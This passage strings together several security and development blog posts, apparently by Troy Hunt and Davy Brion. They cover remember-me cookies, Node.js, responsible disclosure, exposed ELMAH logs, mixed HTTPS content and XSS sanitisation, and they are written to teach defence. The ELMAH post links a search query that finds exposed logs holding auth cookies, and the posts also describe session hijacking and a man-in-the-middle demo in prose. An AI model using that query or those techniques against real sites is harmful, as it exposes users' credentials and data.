example a nonce persisted in both the database and the cookie. This has the benefit of ensuring that if the cookie<em>is</em>obtained by an attacker it has only has a single use scope – and that’s if the user can’t legitimately use it before them. There’s a good little article<a href=\"http://jaspan.com/improved_persistent_login_cookie_best_practice\">here</a>which talks about some mitigations to this pattern and again, there are use cases where this can be beneficial but you are going to invest additional effort building it and there are cases where it will inconvenience legitimate users (i.e. trying to remember yourself on the same site across multiple PCs).</p><p>The last thing worth mentioning is that the same account management principles that need to be considered for active authenticated sessions are relevant in the “remember me” context. For example, are multiple simultaneously authenticated sessions allowed from the one user? If the user changes their password will it disconnect the other sessions? Can an administrator end the authenticated session? There are all sorts of issues that come up that are<em>really</em>part of the discussion on how authenticated sessions are verified and managed, the discussion here is merely about how to reinstate that.</p><h4>When shouldn’t you allow “remember me”? (and some middle-ground alternatives)</h4><p>Sometimes it simply<em>never</em>makes sense to allow an authenticated user to remain authenticated for long periods of time. Banking, for example, is the stereotypical use case for when you want to force re-authentication as soon as possible as the risks are just too significant to leave unused authenticated browser sessions lying around the place.</p><p>But there is actually some middle ground that can be taken here:</p><p><img width=\"240\" height=\"278\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"A\"remember me\" box on the American Express website\" src=\"http://lh4.ggpht.com/-utZn1CP4eZM/UdFGEmoMc9I/AAAAAAAAFc8/Lh20wkoe09Y/image12.png?imgmax=800\" border=\"0\"></p><p>This is not entirely what it looks like – when you come back after an expired session where you asked the site to “Remember Me”, you’ll get this:</p><p><img width=\"241\" height=\"280\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"The American Express website pre-populating the username on return\" src=\"http://lh6.ggpht.com/-4s1S1UF2cYQ/UdFGFMBkHXI/AAAAAAAAFdE/4NdTjBkR_rM/image15.png?imgmax=800\" border=\"0\"></p><p>I’ve not obfuscated the username, the username as it appears above with the stars are stored in a cookie that lasts for three months along with some other data that inevitably identifies the user. Frankly, I don’t see a lot of value in this, remembering your username isn’t usually the problem!</p><p>But it also doesn’t have to be all or nothing, there’s middle ground. For example, the point I made earlier about re-authenticating before key processes are performed if the session had been resumed by a “remember me” feature. It’s a bit of the best of both worlds.</p><h4>In conclusion…</h4><p>This is one of those features that seems like a good idea at the time (and<em>sometimes</em>it is) and it’s usually very easy to get right, at least<em>sufficiently</em>right for most purposes. Frankly, it’s still a little baffling how wrong the two earlier examples got it particularly when you consider that it would have been sufficient to just extend the lifetime of the cookie they already have!</p><p>The other point to take away from this post beyond just the mechanics of the “remember me” feature is how security is such a multi-tiered, inter-dependent beast. You might be able to get away with credentials in cookies by themselves, but combine that with the ELMAH situation or missing HTTP only attributes and XSS flaws and suddenly a foolish albeit relatively innocuous practice becomes a serious risk. What was that about “defence in depth” again?!</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/8M6Zs6dCWn8\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1217}}

Its popularity is increasing rapidly, which means it's a good idea to be aware of what Node.js is and especially how it differs from more traditional technology stacks. In this post, I'll try to give an easy-to-understand overview of what makes Node.js different and make it clear that it's more than just server-side JavaScript. Note that this overview is highly simplified and only meant to help people understand how Node.js works. This is definitely not a completely accurate description of the lower-level details of Node.js.</p><h2>Evented/Asynchronous I/O</h2><p>In most technology stacks, API calls for I/O operations are synchronous. As in, the thread that executes the operation is blocked for the duration of the I/O operation until that operation has completed. Once completed, execution of your code proceeds. Of course, a lot of technology stacks have asynchronous variants of those operations available as well, but generally speaking, they aren't used as often as the synchronous variants. In Node.js, it's the other way around. All I/O operations are asynchronous and there are only a few synchronous implementations available (and you're generally discouraged from using them).</p><p>This means that whenever you do an I/O operation (file manipulation, network requests, database operations, etc…), Node.js initiates the I/O operation through a lower-level C/C++ layer which will perform the operation asynchronously. Once the operation has completed, Node.js will execute your callback function that you passed as a parameter to the I/O operation's function call. The important thing here is that while the I/O operation is being executed, Node.js doesn't have to wait for the operation to complete, and is able to focus entirely on processing other events. And those events can be anything: incoming network requests, executing callbacks from other operations that have completed, or invoking whatever function that is assigned to a particular event.</p><h2>Eventloop</h2><p>The Node.js eventloop is what makes Node.js so interesting and powerful. Node.js basically just keeps reading from an event queue until that queue is empty. As it loops through the events to be processed, it invokes the JavaScript functions that have been assigned for those events. If any of those functions performs an I/O operation, Node.js will initiate the operation and then immediately move to the next event in the event queue. Once the I/O operation has completed, an event will be added to the event queue with a reference to your original callback. Once all preceding events have been processed, Node.js will get to the newly added event and invoke your callback. Because all I/O operations are asynchronous, this enables Node.js to maximize its efficiency as it processes events because it doesn't need to wait for slow I/O operations to complete.</p><h2>Single-threaded</h2><p>One thing that people don't always realize is that the Node.js eventloop is single-threaded. This has some nice benefits but there's a huge drawback as well. The biggest benefit is that you don't need to worry about concurrent access to shared state. After all, there is never more than 1 thread executing your JavaScript functions. This means you don't have to write any locking code to protect shared state. The drawback to the single-threaded eventloop is that you need to be careful not to block the event loop. If you're planning on doing heavy synchronous processing in your JavaScript code, you need to realize that no other events can be processed by Node.js until that synchronous block of code has completed. Obviously, since there's only one thread going through the eventloop, any delay you cause in your code can be very costly to overall throughput and performance. For now, it's best to execute synchronous processing routines as a child process, possibly even in a language that is more suitable for this than JavaScript. But it seems that future Node.js versions will provide a more integrated way to deal with this.</p><h2>Why JavaScript?</h2><p>JavaScript's support of closures and it treating functions as first class objects means it's ideally suited for the evented programming model that Node.js offers. Many people still think of JavaScript as a joke or a toy language, but it's a lot more powerful than many people think it is. Yes, it certainly has problems as well, but it's definitely worth learning. I do hope that this post has made it clear that there's a lot more to Node.js than simply being server-side JavaScript. What makes Node.js so interesting are the principles that I've tried to explain in this post. Those principles can be implemented with other languages as well, and could be made to work just as great as, or perhaps even greater than Node.js itself. But you'd be hard-pressed to find a language that's so ubiquitous, yet completely devoid of a pre-existing synchronous I/O infrastructure.</p><p>Anyways, I hope I succeeded at making it somewhat clear how Node.js works and why it's so different from most other technology stacks.</p> <div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=AsPaZvBN6HA:0t_GLmgkIK8:D7DqB2pKExk\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=AsPaZvBN6HA:0t_GLmgkIK8:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:qj6IDK7rITs\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?d=qj6IDK7rITs\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/davybrion?a=AsPaZvBN6HA:0t_GLmgkIK8:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/davybrion?i=AsPaZvBN6HA:0t_GLmgkIK8:gIN9vFwOqvQ\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/davybrion/~4/AsPaZvBN6HA\" height=\"1\" width=\"1\"/>","author":"Davy Brion","_id":{"$wrap":"$oid","v":1219}}

Now I’m very happy to share how ASafaWeb has been integrated into<a href=\"https://oncheckin.com/\">OnCheckin</a>(the brainchild of<a href=\"http://www.diaryofaninja.com/\">Doug Rathbone</a>) to provide continuous deployment for ASP.NET websites as a cloud-based service.</p><p><img width=\"492\" height=\"101\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"OnCheckin - Cloud Powered Deployment\" src=\"http://lh4.ggpht.com/-QewvOaRCVAE/UcIqJJcxP2I/AAAAAAAAFa0/Lq_jFP5xOfA/OriginalLogo2.png?imgmax=800\" border=\"0\"></p><a name='more'></a><p>Here’s how it works: Firstly, you plug it into source control:</p><p><img width=\"791\" height=\"636\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring source control\" src=\"http://lh3.ggpht.com/-9gS7OyP31vg/UcIqJ9H9scI/AAAAAAAAFa8/yVX3JMb2QA0/image2.png?imgmax=800\" border=\"0\"></p><p>Then you configure the deployment:</p><p><img width=\"785\" height=\"968\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring deployment\" src=\"http://lh6.ggpht.com/-dLELbPIfWuk/UcIqKXe-9EI/AAAAAAAAFbE/pfNLEqbO4OA/image5.png?imgmax=800\" border=\"0\"></p><p>Then finally you review everything and tick the box to run the ASafaWeb scan after every deployment:</p><p><img width=\"788\" height=\"888\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring ASafaWeb\" src=\"http://lh5.ggpht.com/-Uyoj7L3jeDU/UcIqLFxOwbI/AAAAAAAAFbM/wUxPb48a3ao/image31.png?imgmax=800\" border=\"0\"></p><p>That’s it – job done! Now each time the scan runs there’ll be a little ASafaWeb tab and a nice report on how the scan went:</p><p><img width=\"880\" height=\"522\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"The ASafaWeb report in OnCheckin\" src=\"http://lh3.ggpht.com/-xlPwH-zRX9Q/UcIqLwBN_AI/AAAAAAAAFbU/EtXZ9ZXtZWk/image11.png?imgmax=800\" border=\"0\"></p><p>What I really like about this is the continuous nature of the process. Every time that build runs, the site is going to get scanned and so long as you’re keeping an eye on the results you shouldn’t have sneaky security misconfigurations making their way through to production. Well at least not for very long!</p><p>The other thing about this integration is that it’s another step towards publicly releasing the ASafaWeb API. Yes, there’s an API and in fact it’s been used extensively as the magic behind the<a href=\"http://www.troyhunt.com/2012/08/welcome-to-asafaweb-scheduler.html\">ASafaWeb Scheduler</a>which gives you the ability to scan your sites on a regular basis (I mentioned it’s free, right?!). The intention has always been to open the API up for anyone to consume I reckon including it into the continuous integration cycle is a fantastic use-case.</p><p>To that effect, if you’re involved in a similar project and would like to integrate ASafaWeb then I’d love to hear from you. I’m happy to open it up to beta testers who want to contribute feedback and I know there are a<em>ton</em>of good ideas out there for how it might be used.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/0sjQHMWcphI\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1220}}

The theory goes that responsible disclosure is the<em>ethical</em>thing to do whilst airing website security dirty laundry publicly makes you an irresponsible cowboy, or something to that effect.</p><p>But of course these things are not black and white. On a daily basis I’ll see tweets about how a website is storing credentials in plain text: “Hey [insert name here], what’s the go with emailing my password, aren’t you protecting it?”. Is this “responsible”? I think it’s fair to say it’s not<em>irresponsible</em>, I mean the risk is obvious, right?</p><p>How about security risks such as an XSS flaw which might be a little more grey, but is still shared frequently in public? It’s not exactly going to land you the mother lode of sensitive data in a couple of clicks, but it could be used as part of a more sophisticated attack. Or move right on to the other end of the scale where serious flaws lead to serious breaches. It might be default credentials on an admin system or publicly accessible backups, the point is it’s in another realm of risk and impact altogether.</p><p>Anyway, the reason for this post is that a number of events over recent times have given me pause for what<em>I</em>consider responsible disclosure. These events are numerous and include incidents where I’ve ticked every responsibility box in the book and incidents where I’ve been accused of being, well, a cowboy. I wanted to capture – with as much cohesion as possible – what I consider to be responsible disclosure because sure enough, I’ll be called on this again in the future and I want to have a clear point of view that simply won’t fit into 140 characters.</p><p>I’d like to start with two disclosure stories that took very different tacks with different outcomes for both the sites and me personally. Here’s what happened:</p><a name='more'></a><h4>Disclosure story 1: Westfield</h4><p>Two years ago I wrote about<a href=\"http://www.troyhunt.com/2011/09/find-my-car-find-your-car-find.html\">Find my car, find your car, find everybody’s car; the Westfield’s iPhone app privacy smorgasbord</a>. In short, the Westfield shopping centre here in Sydney down at Bondi had an app to help you find your car but it readily disclosed the license plate of every vehicle in the centre’s 2,550 car spaces via an improperly protected JSON feed. Oops.</p><p>This went straight up onto my blog and subsequently,<a href=\"http://www.theaustralian.com.au/australian-it/westfield-iphone-app-in-privacy-fiasco/story-e6frgakx-1226137939073\">straight into the national media</a>. I posted it in the morning and just a few hours later the system was offline. Shortly after that I had a call from the (rather sheepish) developers of it in the US. By mid-afternoon the General Manager had<a href=\"http://www.troyhunt.com/2011/09/find-my-car-find-your-car-find.html#comment-309304475\">commented on my blog post</a>and later made contact personally. He called me that night and we had a very constructive discussion; there wasn’t any anger or malice, it was entirely “Holy shit, this isn’t cool, how do we fix it” which IMHO, was entirely the correct response as it lead to the system getting fixed very quickly.</p><p>tl;dr: the risk was removed almost instantly, the developers were open and receptive, the management was appreciative and hopefully developers everywhere got to learn a thing or two about securing their APIs. Perhaps most importantly though, at-risk customers were spared as quickly as possible from the potential ramifications of disclosing their personal movements.</p><h4>Disclosure story 2: Black and Decker</h4><p>This is very timely as it all took place last week. As I wrote about just yesterday in<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">Security is hard, insecurity is easy – demonstrating a simple misconfiguration risk</a>, Black and Decker had exposed ELMAH logs. Their unfortunate architecture decision to store credentials in cookies (you heard me) meant these were recorded in the logs which numbered 50,000+. So here we have a veritable treasure trove of usernames, passwords, IP addresses, request headers, internal code and other titbits – clearly something to be disclosed privately and obviously given the significance they’d take it seriously and respond promptly. Or so I thought.</p><p>After recording the video for the aforementioned post on Monday afternoon last week (these are all Sydney times), I quickly reached out to Black and Decker on Twitter:</p><p><a href=\"https://twitter.com/troyhunt/status/336384092880908288\"><img width=\"487\" height=\"259\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"@Black_DeckerUS is there a private channel I can report a serious security vulnerability on your website through?

Finally<em>someone</em><em>from Microsoft</em>responds via Twitter and advises they have a relationship with Black and Decker. I privately email their @microsoft.com address on the evening of the 23rd (now the 10th contact) including the<a href=\"https://code.google.com/p/elmah/wiki/SecuringErrorLogPages\">ELMAH Securing Error Log Pages</a>link and they promptly pass it on. Come the morning of the 24th, here’s what happens:</p><p><img width=\"609\" height=\"469\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"ELMAH log now protected at /elmah.axd\" src=\"http://lh4.ggpht.com/-GUFHmN1dpUc/UaUVqiTwnEI/AAAAAAAAFYI/TCOXa70NmcA/image311.png?imgmax=800\" border=\"0\"></p><p>Success! Looks like I’ve finally gotten through! Except, well, I hadn’t really:</p><p><img width=\"609\" height=\"469\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"ELMAH log not protected at /foo/elmah.axd\" src=\"http://lh6.ggpht.com/-yrbc41G-kZE/UaUVsPH0tRI/AAAAAAAAFYQ/C1SGG9iHc3s/image61.png?imgmax=800\" border=\"0\"></p><p>This is a little issue that came up in<a href=\"http://www.troyhunt.com/2012/01/aspnet-session-hijacking-with-google.html\">my original post on session hijacking with Google and ELMAH</a>and it’s because the handler is registered globally yet explicitly secured only when it appears in the root. It’s a simple fix that’s (now) explained very clearly on the ELMAH site (which I’d sent them), the handler just needs to be registered beneath the location in which it’s used.</p><p>So the 11th contact goes out and it’s back to Microsoft because I<em>still</em>haven’t had any personal contact from Black and Decker. I had a response from Microsoft just 9 minutes later even though it was about 19:30 local so kudos to them for their proactivity. Remember, this was all on the morning of the 24th (Friday last week) but by late that evening my time ELMAH was still accessible. Granted, it was evening over in the US but we’re now more than 100 hours into this saga.</p><p>Finally, come Saturday morning, ELMAH is secure. That’s four and a half days of time wasted from initial contact to securing the risk. Remember, this involved customers’ usernames and passwords on public display, no doubt in many cases the same ones they use for their email or to do their banking.</p><p>4 days after everything was resolved and 9 days since I first raised the risk, I’ve also not had any response from Black and Decker. Zero. Zip. Nada. Not a “Thanks mate” nor a “Mighty nice of you to point this out privately”, no “How might we fix this?” or “Is there anything else we should look at?”, just absolute silence. Now I don’t privately disclose in order to achieve any sort of personal benefit, but by my moral compass when you do someone a favour – particularly one that could save them a great deal of inconvenience – a little gratitude in response goes a long way.</p><p>This incident plus the Westfield one and literally dozens of others – some I’ve written about, many I’ve not – lead me to wonder: what circumstances predicate themselves to private disclosure? When is public a better option? I broke it down into three measures, let me explain.</p><h4>1. What is the purpose of disclosing the risk?</h4><p>Particularly when a public disclosure lands on the front page of the news and consequently on the CTO’s (or even CEO’s) desk, inevitably the question comes up – why’d he do it? What’s in it for him? What does this guy want from us?</p><p>On numerous occasions, after making a public disclosure I’ve had private responses which clearly indicate the sender is under the impression that I’m after money. You can almost read “Ok, how much do you want to help us fix this thing?” between the lines of an otherwise polite but curt response. This can<em>never</em>be the intent of disclosure, doing this would amount to nothing less than running an extortion racket.</p><p>The purpose<em>cannot</em>be self-serving, when this is the case there’s nothing to stop you from running around calling out every single vuln you find and to hell with the consequences. Whilst there’s unarguably a reputation boost from a carefully constructed public disclosure, there has to be a “greater good”.</p><p>The single most significant beneficiary of public disclosures I make are software developers. I want to help these guys understand the ins and outs of website security and nothing gets their attention more than publicly calling out examples. But just as importantly, you have to help them understand<em>why</em>the risks are, well, risks. Also just as importantly, you need help them understand how to fix those risks, not just stand there and give a “Ha Ha” Nelson Muntz style, that’s really not going to help anyone.</p><p><img width=\"400\" height=\"250\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Nelson Muntz - Ha Ha!\" src=\"http://lh5.ggpht.com/-lj7gA6jC_dE/UaUVt-0MNsI/AAAAAAAAFYY/8KQ3957hMOs/seven_bullies_062.png?imgmax=800\" border=\"0\"></p><p>Of course the other beneficiary is those who would be impacted if the risk was exploited. If disclosing the risk will lead to the site owner rectifying it<em>before</em>customers can be adversely impacted, then that’s a good thing. Which leads me neatly to the second point.</p><h4>2. Who is the victim if it’s exploited?</h4><p>When a vuln is disclosed, naturally there is a risk that someone will then exploit it. Who is impacted if that happens is extremely important because in the scheme of exploited website risks there are really two potential victims: the users of the site and the site owner.</p><p>In this context, website users are innocent parties, they’re simply using a service and expecting that their info will be appropriately protected. Public disclosure must not impact these guys, it’s simply not fair. Dumping passwords alongside email addresses or usernames, for example, is going to hurt this group. Yes, they shouldn’t haven’t reused their credentials on their email account but they did and now their mail is pwned. That’s a completely irresponsible action on behalf of those who disclosed the info and it’s going to seriously impact ordinary, everyday people.</p><p>On the other hand, disclosing XSS or TLS flaws doesn’t pose an immediate threat to consumers, an attacker still needs to go out and weaponise the risk. This might involve the attacker constructing phishing scams or organising themselves to the extent that they can actually go and sniff packets from at-risk users. Of course this happens, but it takes some effort, at least enough effort so that the site owner can fix or disable the feature in advance.</p><p>On the other hand, risks that impact only the site owner are, in my humble opinion, fairer game. The site owner is ultimately accountable for the security position of their asset and it makes not one iota of difference that the development was outsourced or that they rushed the site or that the devs just simply didn’t understand security. When the impact of disclosure is constrained to those who are ultimately accountable for the asset, whether that impact be someone else exploiting the risk or simply getting some bad press, they’ve only got themselves to blame.</p><h4>3. What is the likelihood of the risk being fixed?</h4><p>There are many instances on this blog where I’ve written about poor security. There are many instances<em>not</em>on this blog where I’ve privately written to website owners about poor security. Overwhelmingly, risks I’ve disclosed publicly have been taken seriously and equally overwhelming, risks I’ve disclosed privately haven’t been. There are exceptions, but there is no arguing the pattern and it’s exemplified by the Westfield and Black and Decker examples I opened with.</p><p>When a risk is disclosed publicly, the website owner is on notice. There is no arguing the increased visibility public disclosure creates and there is also no arguing that it expedites the remediation process on behalf of the site owner. Partly this is due to the increased likelihood of the risk being exploited and partly it’s because in the face of public naming and shaming, the site owner is somewhat compelled to respond.</p><p>The other thing that tends to happen when a risk is made public is that the one lone voice that was the discloser suddenly becomes a chorus of like-minded individuals. For example,<a href=\"https://twitter.com/UKTesco/status/229542141012107265\">this tweet</a>has now been RT’d over 2,100 times and as you’ll see from the responses, generated an awful lot of noise about the woeful state of Tesco’s security. You can’t ignore that sort of pressure (certainly<a href=\"http://www.itpro.co.uk/642391/ico-to-investigate-tesco-over-website-security-concerns\">the ICO didn’t</a>) and without doubt it increases the pressure on an organisation to address their security.</p><h4>Moving forward</h4><p>I hope this gives some insight into my personal view of disclosure, I wouldn’t have approached Black and Decker any differently (it doesn’t satisfy rule 2 on victim impact) and likewise I wouldn’t have approached Westfield any differently (the results speak for themselves). Sometimes<a href=\"https://twitter.com/zimzat/status/328996255537696768\">people will have views that differ</a>but frankly, if I can satisfy those measures I’ve described above then I can sleep at night with confidence that on balance, security on the web has benefited.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/fhxbf8LPLU8\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1222}}

Not all aspects of it, mind you, but the prevalence of website hacks would seem to indicate that plenty of people are struggling to get it right.</p><p>On the other hand,<em>insecurity</em>can be very easy. What I mean by this is that sometimes it can be the smallest change to a website that blows the security wide open.</p><p>Last week someone passed me a private note about Black and Decker, or more to the point, they passed me a link to an unsecured ELMAH log. For the uninitiated, ELMAH logs and their discovery via Google is something<a href=\"http://www.troyhunt.com/2012/01/aspnet-session-hijacking-with-google.html\">I’ve written about before</a>. In fact in this very case it was someone simply searching for some info on ELMAH that lead to this discovery – it’s that easy.</p><p>Now I want to stress that<strong><em>this is not intended to be all about Black and Decker</em></strong>and before posting this I did privately contact them and they have now correctly secured the logs. In fact<strong><em>there are tens of thousands of<a href=\"https://www.google.com/search?q=inurl%3Aelmah.axd+ASPXAUTH\">Google results for publicly exposed ELMAH logs</a></em></strong>so clearly this is a very prevalent risk. Let me first share the video on what you can do with exposed ELMAH logs then I’ll come back around to the point of this post:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/6ipVqkUm6Gw?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>That should put things into context regarding the risk of exposed ELMAH logs and it goes<em>well</em>beyond just session hijacking. For example the risk includes access to:</p><ol><li>Customer email addresses as they’re stored in the cookie</li><li>IP address of users (including of individual customers per the previous point)</li><li>Passwords (these are also sometimes stored in cookies)</li><li>Referrers (discloses entry points into the site)</li><li>Any other data on the site that is accessible if the session can be hijacked</li></ol><p>Keep in mind that there are tens of thousands of log entries in this particular site so there’s quite a profile an attacker could have built up.</p><p>Here’s the point I want to make:<strong><em>a frankly massive security hole like exposed ELMAH logs can occur as a result of the smallest configuration change</em></strong>and it begs the following questions:</p><p><strong>Is there any continuous security scanning of the site?</strong>This was a very basic error and in fact my own very basic<a href=\"https://asafaweb.com/\">ASafaWeb</a>scanner could have caught this on a daily scheduled scan and reported it within 24 hours of the risk occurring. Other commercial products could have identified a far broader range of risks but the point is that security scanning needs to be<em>continuous</em>, not just a one off, not on an annual basis, not just on major changes but<em>all the time</em>.</p><p><strong>Who can release changes?</strong>You’ve gotta wonder if a case like this was just a junior dev not realising what they were doing. Mind you, I’ve seen plenty of experienced devs make similar mistakes but it begs the question: just how easy is it to slip something through into a production? Is anyone actually overseeing the process? Or does one person have a few beers on a Friday afternoon and push the “publish” button?</p><p><strong>What’s the post-release review process?</strong>It’s<em>extremely</em>easy for configuration related vulnerabilities to slip through during the release process. For example a developer just wants to quickly check the details of an obscure error in a production environment so they release with verbose errors (i.e. turn off custom errors in ASP.NET) and promise themselves they’ll lock it down later. The release process should ideally catch this and set off all sorts of alarms.</p><p><strong>Are you contactable for when things go wrong?</strong>I hadn’t planned on including this section originally but given the way things played out (more on that another time), it does illustrate an important point. It was<em>extremely</em>difficult to get in touch with anyone from Black and Decker using social media and published email addresses and I eventually got through to them in a very round-a-bout fashion. It’s very hard for people to do the right thing and disclose privately when they can’t get in touch with you!</p><p>Black and Decker presented a good opportunity to illustrate the risk because of their sheer scale. This is a multinational organisation pulling in $6B a year and employing 27,000 people and something so simple slipped past them, is it any wonder that so many companies with such fewer resources struggle? And I’ll stress again – there is (unfortunately) nothing very unique about them having a risk of this nature – it’s alarmingly common as it’s so simple to do. Insecurity is indeed, easy.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/1gV-R5Qrv3k\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1224}}

The problem, as you’ll see in the video below, is that it jeopardises the security of traffic going backwards and forwards over what otherwise appears to be a secure site, at least in terms of implementing SSL. This can lead to issues such as the theft of identity data, potentially including such personal information as social security numbers. Fortunately there’s a channel to report potentially fraudulent activity except that, well, this video explains it best:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/CSmacMZ0xZo?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>Of course it’s ironic that it’s the Social Security Administration that’s made a bit of a botch of this but it’s an all too familiar scenario.<a href=\"http://www.troyhunt.com/2012/07/lessons-in-website-security-anti.html\">Tesco did it</a>,<a href=\"http://www.troyhunt.com/2013/05/why-i-am-worlds-greatest-lover-and.html\">so did Versa Lift</a>,<a href=\"http://www.troyhunt.com/2013/04/5-ways-to-implement-https-in.html\">so did Top CashBack</a>and a heap of others I haven’t previously written about. It’s rampant.</p><p>That’s the risk covered, let’s focus on the fixes and they’re all dead easy:</p><ol><li>Embed external content explicitly via the HTTPS scheme. If you’re only serving the page over HTTPS anyway then it ensures no slip ups.</li><li>Use a protocol relative URL or in other words, embed resources such as the jQuery file in the example above as //ajax.googleapis.com/… Yes, I know it looks weird but it works and it means when the page is loaded over HTTP then the resource will be requested over HTTP. Load the page over HTTPS and the resource embeds over HTTPS.</li><li>Test your damn web pages! No seriously, this is a fundamentally basic flaw and as soon as you load the page most browsers will start complaining. Have we – even us developers – become so desensitised to security warnings that we totally ignore them?!</li></ol><p>For the curious, as I mention in the video this demonstration was achieved by mounting a man in the middle attack at the proxy level. I used<a href=\"http://fiddler2.com/\">Fiddler</a>as the proxy and<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler Script</a>to modify the jQuery file in the OnBeforeResponse event. Whilst all this occurred within my PC, it demonstrates the alibility for it to happen at a proxy server anywhere – or at the internet gateway of your local cafe, or elsewhere in the ISP, or via a<a href=\"http://www.enigmacurry.com/category/diy/\">wiretap</a>on an enthernet cable or<a href=\"http://www.troyhunt.com/2013/04/the-beginners-guide-to-breaking-website.html\">as I’ve shown recently with the Pineapple</a>, via a rogue wireless access point the victim is connected to, possibly even without their knowledge.</p><p>Now as with my previous video on<a href=\"http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html\">the risk of loading login forms over HTTP</a>, many people will ask “Is this really a likely risk?” In fact that’s just<a href=\"https://twitter.com/paulswail/status/342836543855144960\">the discussion I had with Rob Conery</a>after the aforementioned post as even<a href=\"http://tekpub.com/\">TekPub</a>follows this pattern. I look at it like this: you implement SSL primarily because you’re concerned about the risk of someone intercepting your traffic. Assuming you acknowledge – and attempt to protect against – this risk, you accept that all the HTTP components of the communication remain vulnerable ergo you need to protect against the SSL anti-patterns mentioned here.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/pczeDYOJ1KU\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1225}}

In that post I pointed out the ease with which you could decorate Billabong’s registration page with the beautiful Miranda Kerr and a slightly stoned looking Bugs Bunny. In this post here, the ramifications of getting XSS wrong means stealing someone’s session and pulling out their personal details, all because of this:</p><p><img width=\"866\" height=\"534\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Stealing Billabong cookies\" src=\"http://lh3.ggpht.com/-HQJEtHP7vlU/UaZit9xh1KI/AAAAAAAAFYo/Zs_aoCI6mN4/image12.png?imgmax=800\" border=\"0\"></p><p>I’ll come back to that, let’s first go back to the title and focus on input sanitisation and output encoding contexts. If XSS is an entirely new concept to you, start by taking a look at<a href=\"http://www.troyhunt.com/2010/05/owasp-top-10-for-net-developers-part-2.html\">my post on it here</a>then come back to this one.</p><a name='more'></a><h4>Sanitising user input</h4><p>The theory goes like this: expect any untrusted data to be malicious. What’s untrusted data? Anything that originates from outside the system and you don’t have absolute control over so that includes form data, query strings, cookies, other request headers, data from<em>other</em>systems (i.e. from web services) and basically anything that you can’t be 100% confident doesn’t contain evil things.</p><p>Evil things can be SQL injection, malicious files, attempts to traverse internal directory structures or XSS payloads. So what do you do about untrusted data? You try and filter it out and there are two ways to approach this:</p><ol><li><strong>Blacklist:</strong>You describe everything you know is<em>bad</em>, for example you don’t allow a&lt;script&gt; tag or quotes. The trick here is that you have to comprehensively come up with everything that you think might be bad 